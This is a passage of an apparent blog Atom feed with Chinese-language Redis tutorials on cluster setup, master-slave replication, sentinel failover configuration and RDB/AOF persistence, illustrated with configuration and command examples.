class="line"><span class="comment">#启动集群</span></span><br><span class="line">create-cluster start</span><br><span class="line"><span class="comment">#分配槽点，可以手动redis-cli --cluster设置</span></span><br><span class="line">create-cluster create</span><br><span class="line"><span class="comment">#redis-cli --cluster手动分配槽点</span></span><br><span class="line">redis-cli --cluster create ip:port[ ip:port....] --cluster-replicas</span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本设置，create-cluster脚本内容</span></span><br><span class="line">PORT=30000<span class="comment">#端口</span></span><br><span class="line">TIMEOUT=2000<span class="comment">#超时时长</span></span><br><span class="line">NODES=6<span class="comment">#几个redis节点</span></span><br><span class="line">REPLICAS=1<span class="comment">#NODES*REPLICAS为redis实例个数，此处为6表示3个主，3个从</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连接集群入口，-c表示是集群，会自动重定向</span></span><br><span class="line">redis-cli -c -p 30001</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新分配槽位，可以手动指定移动的槽位数、目标redis的id等</span></span><br><span class="line">redis-cli --cluster reshard ip:port</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">这时可以使用事务操作，但是可能会导致不同的key在不同的redis实例上导致事务失败。</span><br><span class="line">可以人为的给key设置前缀使得其分配到同一个rendis上，这样就可以使用事务</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一致性hash&quot;&gt;&lt;a href=&quot;#一致性hash&quot; class=&quot;headerlink&quot; title=&quot;一致性hash&quot;&gt;&lt;/a&gt;一致性hash&lt;/h3&gt;&lt;p&gt;考虑一种场景：现在后端有多个redis服务器提供&lt;strong&gt;缓存&lt;/strong&gt;功能，客户端向redis写时想要实现在不同的redis服务器中写，从而使得redis服务器的压力减少，这里就需要算法来将数据映射到某个redis服务器上，从而引出一致性hash算法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Redis" scheme="http://yoursite.com/categories/Redis/"/>
    
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="predixy" scheme="http://yoursite.com/tags/predixy/"/>
    
      <category term="twemproxy" scheme="http://yoursite.com/tags/twemproxy/"/>
    
  </entry>
  
  <entry>
    <title>Redis(5)-主从复制</title>
    <link href="http://yoursite.com/2020/02/14/Redis-5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>http://yoursite.com/2020/02/14/Redis-5-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
    <published>2020-02-14T08:26:42.000Z</published>
    <updated>2020-02-19T02:12:33.317Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis的主从复制与mysql类似，将数据从master复制到slave，从而实现数据集的冗余。用户向master端写数据时，redis通过sync以非阻塞方式向slave发送数据，从而slave执行相同操作。另外每个master可以有多个slave，每个slave也可以有slave，即支持串行链式复制。</p><a id="more"></a><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</p><p>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</p><p>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</p><p>读写分离：可以用于实现读写分离，主库写、从库读，读写分离不仅可以提高服务器的负载能力，同时可根据需求的变化，改变从库的数量；</p><p>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>master以ping的方式来检测slave是否在线(也可以被动接收slave的sync请求)，如果slave在线则master启动子进程将内存中的数据以快照方式(RDB)保存到文件中并将该文件发送给slave，这个文件保存在slave的磁盘中，之后再将slave磁盘中的数据装载到其内存中(slave装载前会将自身FLUSHALL)。第一次建立时会消耗很多时间将整个数据集同步，后来master会持续将新的写操作发送给slave从而保持一致性操作。</p><p>注意，如果slave挂了再重启，如果是RDB模式，dump文件中会保存master的id，从而实现增量恢复。而如果使用AOF模式，那么即使现在AOF采用RDB先备份，也无法实现增量，而是全量恢复。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在slave服务器的配置文件中加入：</span></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者在slave命令行(redis-cli)中使用slaveof命令，5.0后改成replicaof</span></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line">replicaof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/etc/redis/目录下配置文件</span></span><br><span class="line">replica-serve-stale-data<span class="comment">#主从复制时如何处理客户端请求，默认yes表示正常应答(会有过时数据)，no表示拒绝并返回错误提示</span></span><br><span class="line">replica-read-only<span class="comment">#从节点是否处理写请求，默认为yes</span></span><br><span class="line">repl-diskless-sync<span class="comment">#主从数据复制是否使用无硬盘复制功能。默认值为no。</span></span><br><span class="line">repl-diskless-sync-delay<span class="comment">#当启用无硬盘备份，服务器等待一段时间后才会通过套接字向从站传送RDB文件，这个等待时间是可配置的。这一点很重要，因为一旦传送开始，就不可能再为一个新到达的从站服务。从站则要排队等待下一次RDB传送。因此服务器等待一段时间以期更多的从站到达。延迟时间以秒为单位，默认为5秒。要关掉这一功能只需将它设置为0秒，传送会立即启动。默认值为5。</span></span><br><span class="line">repl-disable-tcp-nodelay<span class="comment">#默认值为no。yes表示redis会使用较少量的TCP包和带宽向从站发送数据。但这会导致在从站增加一点数据的延时。Linux内核默认配置情况下最多40毫秒的延时。如果选择no，从站的数据延时不会那么多，但备份需要的带宽相对较多。</span></span><br><span class="line">repl-backlog-size 1mb<span class="comment">#redis内存维护的队列，用于存储增量备份时的增量，给slave进行增量恢复</span></span><br><span class="line">slave-priority 100<span class="comment">#指明slave的优先级，数字越小优先级越低</span></span><br><span class="line">min-slaves-to-write 3<span class="comment">#如果slave服务器小于3个，master服务器就拒绝写请求</span></span><br><span class="line">min-slaves-max-lag 10<span class="comment">#slave服务器不能滞后于master10s以上，否则master拒绝写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">设置主从复制时，从服务器的<span class="built_in">bind</span>地址和主服务地址必须是同一网段的，或者直接0.0.0.0更好，否则会无法连接</span><br><span class="line">如果master使用requirepass开启认证功能，slave需要使用masterauth &lt;password&gt;进行认证</span><br></pre></td></tr></table></figure><h3 id="sentinel哨兵"><a href="#sentinel哨兵" class="headerlink" title="sentinel哨兵"></a>sentinel哨兵</h3><p>哨兵，是独立进程(redis-sentinel)，它用于监视主从多个redis服务器中master服务器的工作状态(它只监视master是因为可以从master中获取slave信息)。它获取master的信息并通过master就可以获取它的从节点的信息，一旦master挂了就可以调度slave充当master。当然为了避免哨兵误判master，哨兵的个数一般也是3个以上的奇数个，当一个哨兵检测不到master时会判断其他哨兵能否检测，如果所有哨兵都检测不到master则说明master真正挂了，从而调度slave成为master。</p><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><p>服务器自身初始化，运行redis-sentinel或者redis-server中专用sentinel的代码；然后初始化sentinel状态，根据给定的配置文件初始化监控的master服务器列表；最后创建连接master的连接。</p><p>sentinel会以秒级为单位向各个master发送ping命令，对方必须回复pong，否则就会判定主观下线，若多个sentinel都ping不通该master则表示master挂了，即为客观下线。</p><ul><li>主观下线：一个sentinel判断master下线</li><li>客观下线：多个sentinel均判断master下线</li></ul><p>当过半的sentinel发现某master下线，之后即判定该master已故障下线。然后sentinel根据各个slave的优先级来投票选举新的master，将选举出来的slave切换为master，然后将原来的master变为slave并添加到新的master的slave信息中，同步数据并修改sentinel的新master地址，至此，故障转移结束。</p><p>需要过半的原因是考虑到脑裂问题(也叫做网络分区问题)，比如有3个sentinel，其中3个分别独立监控master，那么如果一个sentienl发现master下线，另一个发现sentienl在线，那么是不能判断master到底是否在线。因此需要过半的sentinel一致判断master下线才能说明master真下线。</p><p>sentinel通常使用奇数，考虑一种情况：3个sentinel和4个sentinel的模型，由于需要过半的sentinel决策才不会出现脑裂问题，那么3个sentinel需要2个决策，允许1个发生错误；4个sentinel需要3个决策，容许1个发生错误，考虑到4个sentinel发生1个故障的风险肯定要比3个sentinel发生1个故障的风险要大，因此只考虑奇数个sentinel。(这不仅仅是钱的问题，更是风险问题)</p><p>另外，我们知道一个sentinel通过它监控的master可以获得其他slave的信息，但是sentinel是如何知道其他sentinel的存在的呢？这里使用了消息订阅机制，即所有sentinel都不断的在一个channel叫做<code>&quot;__sentinel__&quot;</code>的频道发送hello消息，其他sentinel只要订阅这个channel就可以知道还有哪些sentinel在线。</p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sentinel配置文件需要手动创建，此处创建为sentinel-6379.conf</span></span><br><span class="line"><span class="comment">#在源码目录的src里也有配置文件实例</span></span><br><span class="line"><span class="comment">#设置监听端口</span></span><br><span class="line">port 26379</span><br><span class="line"><span class="comment">#是否运行为守护进程</span></span><br><span class="line">daemonize yes</span><br><span class="line"><span class="comment">#日志syslog</span></span><br><span class="line">logfile <span class="string">"26379.log"</span></span><br><span class="line"><span class="comment">#临时文件目录</span></span><br><span class="line">dir <span class="string">"/tmp"</span></span><br><span class="line"><span class="comment">#指明监控的主节点，mymaster表示自定义的master名称，后接主节点ip和port；2表示sentinel同意的数量；可以定义多个，即一组sentinel集群可以监控多个m/s集群</span></span><br><span class="line">sentinel monitor mymaster 192.168.250.132 7000 2</span><br><span class="line"><span class="comment">#判断master不在线的超时时长，单位为ms</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 30000</span><br><span class="line"><span class="comment">#新创建master时允许多少slave向其发送请求</span></span><br><span class="line">sentinel parallel-syncs mymaster 1</span><br><span class="line"><span class="comment">#故障转移的超时时长，即master挂了后slave变为新master的超时时长，单位为ms</span></span><br><span class="line">sentinel failover-timeout mymaster 15000</span><br><span class="line"><span class="comment">#master启动auth时需要验证</span></span><br><span class="line">sentinel auth-pass mymaster 123</span><br></pre></td></tr></table></figure><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用该命令根据PATH位置的配置文件启动一个sentinel</span></span><br><span class="line">redis-sentinel PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用redis-cli可以进入交互式</span></span><br><span class="line">redis-cli -h IP -p PORT</span><br><span class="line"></span><br><span class="line"><span class="comment">#相关命令</span></span><br><span class="line"><span class="comment">#查看master信息</span></span><br><span class="line">sentinel masters</span><br><span class="line"><span class="comment">#查看slave信息，需要指明是哪个master集群的</span></span><br><span class="line">sentinel slaves &lt;master name&gt;</span><br><span class="line"><span class="comment">#根据master名称获取master地址</span></span><br><span class="line">sentinel get-master-addr-by-name &lt;master name&gt;</span><br><span class="line"><span class="comment">#重置所有操作</span></span><br><span class="line">sentinel reset</span><br><span class="line"><span class="comment">#手动执行故障转移</span></span><br><span class="line">sentinel failover &lt;master name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;主从复制&quot;&gt;&lt;a href=&quot;#主从复制&quot; class=&quot;headerlink&quot; title=&quot;主从复制&quot;&gt;&lt;/a&gt;主从复制&lt;/h3&gt;&lt;p&gt;redis的主从复制与mysql类似，将数据从master复制到slave，从而实现数据集的冗余。用户向master端写数据时，redis通过sync以非阻塞方式向slave发送数据，从而slave执行相同操作。另外每个master可以有多个slave，每个slave也可以有slave，即支持串行链式复制。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Redis" scheme="http://yoursite.com/categories/Redis/"/>
    
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="主从复制" scheme="http://yoursite.com/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Redis(4)-持久化</title>
    <link href="http://yoursite.com/2020/02/13/Redis-4-%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <id>http://yoursite.com/2020/02/13/Redis-4-%E6%8C%81%E4%B9%85%E5%8C%96/</id>
    <published>2020-02-13T14:01:13.000Z</published>
    <updated>2020-02-19T02:12:30.044Z</updated>
    
    <content type="html"><![CDATA[<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>redis数据全部保存在内存中，因此它处理请求很快，但是为了长久保存这些数据还需要将内存中的数据保存到磁盘中，这就引出持久化概念。需要注意的是，持久化不能取代备份，仍然要指定相关的备份策略。</p><a id="more"></a><h4 id="写时复制"><a href="#写时复制" class="headerlink" title="写时复制"></a>写时复制</h4><p>当我们使用fork系统调用生成一个子进程时，为了提高进程创建的速度，子进程的内存不使用调度的方式分配，而是使用类似页面共享的方法，即子进程的虚拟地址和物理地址的映射和父进程映射是相同的，子进程的地址空间相当于父进程的副本。</p><p>当子进程或者父进程发生写操作时，将需要写的物理内存地址空间作复制一份，即写在新的物理地址空间，这样就不会影响原来的地址空间内的数据。即不管父进程还是子进程对其共享的内存中的数据进行修改都不会影响对方的访问，对方仍然访问的是fork是的数据。</p><h4 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h4><p>以fork方式生成一个子进程以快照模式保存整个数据集，保存格式是二进制格式。它按照事先定义的策略，周期性地将数据全部保存至磁盘(不是增量)，其数据文件默认为dump.rdb。linux操作系统有<strong>写时复制</strong>机制，父进程和子进程会共享相同的物理页面，当父进程处理写请求时，操作系统为父进程修改的页面创建副本，因此此时子进程快照保存时一定是时间点一致的数据。(RDB时只有父进程写，子进程负责读进行备份)</p><p>客户端也可以显示使用SAVE和BGSAVE命令启动快照保存机制</p><ul><li>SAVE：同步，在主进程中保存快照，此时会阻塞所有客户端请求</li><li>BGSAVE：异步，fork子进程在后台执行，不会阻塞主进程处理请求</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RDB配置文件，保存在/etc/redis目录中</span></span><br><span class="line">save<span class="comment">#这里是用来配置触发Redis的持久化条件，也就是什么时候将内存中的数据保存到硬盘，格式为save num1 num2表示num1秒内有num2个key发生变化则同步到磁盘，使用的是bgsave机制</span></span><br><span class="line">rdbcompression<span class="comment">#对于存储在磁盘的快照是否压缩存储，默认为yes</span></span><br><span class="line">rdbchecksum<span class="comment">#对于存储的快照是否校验，默认yes</span></span><br><span class="line">dbfilename<span class="comment">#设置快照名称，默认为dump.rdb</span></span><br><span class="line">dir<span class="comment">#设置快照文件的存放路径，这个配置项一定是个目录，使用dbfilename作为文件名</span></span><br><span class="line">stop-writes-on-bgsave-error<span class="comment">#当同步磁盘失败时是否停止接收数据，默认为yes</span></span><br></pre></td></tr></table></figure><h4 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h4><p>Append only file，表示将所有写操作都追加到AOF文件的末尾，但是这样可能会因为重复冗余的写操作导致文件过大，因此redis提供合并冗余操作的机制BGREWRITEAOF来优化。例如重复1000次incr命令，这样会导致大量的incr命令附加到AOF文件末尾，这效率极低，而使用BGREWRITEAOF优化后会将重复的写命令以少量的已存在的命令进行替换。这种优化策略根据redis版本分为两种：</p><ul><li>4.0以前：BGREWRITEAOF实际上是对内存中现存的AOF文件进行重写，首先主进程fork一个子进程来处理，它不会读取内存中已存的AOF文件，而是通过将内存中的数据以命令的方式保存到临时文件中，在这个过程中主进程仍然会接收客户端请求，且将这些请求的写操作依然保存于原来的AOF文件中且同时保存在一个缓冲队列中(依旧保存在老的AOF文件中是防止重写AOF失败导致这期间的写操作请求丢失)，子进程重写入临时文件结束后通知父进程，父进程将保存在缓冲队列中的命令追加写入临时文件中，然后父进程用临时文件替换老的AOF文件。</li><li>4.0以后：采取的策略也是重写，它虽然使用BGREWRITEAOF机制来优化但优化机制不一样，新版使用的是RDB和AOF结合的方式。它将老的数据RDB到AOF文件中，将增量的数据以指令的方式追加到AOF中。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AOF配置文件，保存在/etc/redis目录中</span></span><br><span class="line">appendonly<span class="comment">#使用AOF主从方式，默认为no</span></span><br><span class="line">appendfilename<span class="comment">#文件名称</span></span><br><span class="line">appendfsync<span class="comment">#持久策略，no表示不执行fsync，由内核保证数据同步到磁盘(内核缓冲区满后写入磁盘)，可能会丢失一个缓冲区大小的数据(一般位4k)；always表示每次写入都执行fsync，以保证数据同步到磁盘；everysec表示每秒执行一次fsync，可能会导致丢失这1s数据</span></span><br><span class="line">auto-aof-rewrite-percentage 100<span class="comment">#表示当前AOF文件已经是上次重写AOF是的二倍，立即触发重写AOF</span></span><br><span class="line">auto-aof-rewrite-min-size 64mb<span class="comment">#表示当前AOF文件大小超过64mb时进行AOF重写操作</span></span><br><span class="line">no-appendfsync-on-rewrite no<span class="comment">#表示是否在重写AOF时将新写操作进行缓存，yes表示缓存</span></span><br><span class="line">aof-use-rdb-preamble yes<span class="comment">#是否使用老数据rdb，新数据AOF的方式进行持久化</span></span><br></pre></td></tr></table></figure><h4 id="AOF文件格式"><a href="#AOF文件格式" class="headerlink" title="AOF文件格式"></a>AOF文件格式</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#假设写一个set k1 hello</span></span><br><span class="line"><span class="string">*2</span></span><br><span class="line"><span class="string">$6</span></span><br><span class="line"><span class="string">SELECT</span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="string">*3</span></span><br><span class="line"><span class="string">$3</span></span><br><span class="line"><span class="string">set</span></span><br><span class="line"><span class="string">$2</span></span><br><span class="line"><span class="string">k1</span></span><br><span class="line"><span class="string">$5</span></span><br><span class="line"><span class="string">hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line"><span class="string">第一行*2表示这一部分有两段，分别是$开头的两个</span></span><br><span class="line"><span class="string">$6表示下一个操作的字符数</span></span><br><span class="line"><span class="string">可以手动删除操作过的序列，没写入磁盘时可以重启redis进行恢复</span></span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>如果RDB和AOF同时启用，则BGSAVE和BGREWRITEAOF不会同时执行，且在redis服务器启动用于恢复数据时，优先使用AOF。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;持久化&quot;&gt;&lt;a href=&quot;#持久化&quot; class=&quot;headerlink&quot; title=&quot;持久化&quot;&gt;&lt;/a&gt;持久化&lt;/h3&gt;&lt;p&gt;redis数据全部保存在内存中，因此它处理请求很快，但是为了长久保存这些数据还需要将内存中的数据保存到磁盘中，这就引出持久化概念。需要注意的是，持久化不能取代备份，仍然要指定相关的备份策略。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Redis" scheme="http://yoursite.com/categories/Redis/"/>
    
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="写时复制" scheme="http://yoursite.com/tags/%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6/"/>
    
  </entry>
  
</feed>
